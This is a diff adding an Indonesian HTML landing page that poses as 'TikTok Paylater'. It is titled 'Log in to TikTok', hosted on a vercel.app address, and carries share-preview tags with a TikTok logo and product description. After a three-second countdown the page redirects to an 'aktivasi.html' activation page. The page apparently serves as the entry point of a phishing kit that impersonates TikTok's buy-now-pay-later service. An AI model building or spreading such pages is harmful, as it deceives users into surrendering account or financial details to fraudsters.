@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masuk ke Tiktok</title>
+    
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="TikTok Paylater" />
+    <meta property="og:image" content="https://tiktokshop-beige.vercel.app/logo.jpg" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:title" content="Tiktok Paylater" />
+    <meta property="og:description" content="TikTok PayLater adalah fitur buy now, pay later di TikTok Shop yang memungkinkan Anda berbelanja barang impian sekarang dan membayarnya nanti dengan cicilan hingga 12 bulan. " />
+    <meta property="og:url" content="https://tiktokshop-beige.vercel.app/" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000000;
+            position: relative;
+        }
+        #gambarPembuka {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+      
+        }
+    </style>
+</head>
+<body>
+    <img id="gambarPembuka" src="buka.png" alt="tiktok">
+    <div id="timer">3</div>
+
+    <script>
+        let waktu = 3;
+        let timerDisplay = document.getElementById('timer');
+        
+        let hitungMundur = setInterval(function() {
+            waktu--;
+            timerDisplay.textContent = waktu;
+            
+            if (waktu <= 0) {
+                clearInterval(hitungMundur);
+                // Hapus document.write jika tidak perlu, atau tampilkan pesan di elemen HTML
+                window.location.href = "aktivasi.html"; // Pastikan aktivasi.html ada di folder yang sama
+            }
+        }, 1000); // Diubah jadi 1000ms = 1 detik agar hitungan wajar
+    </script>
+</body>
+</html>
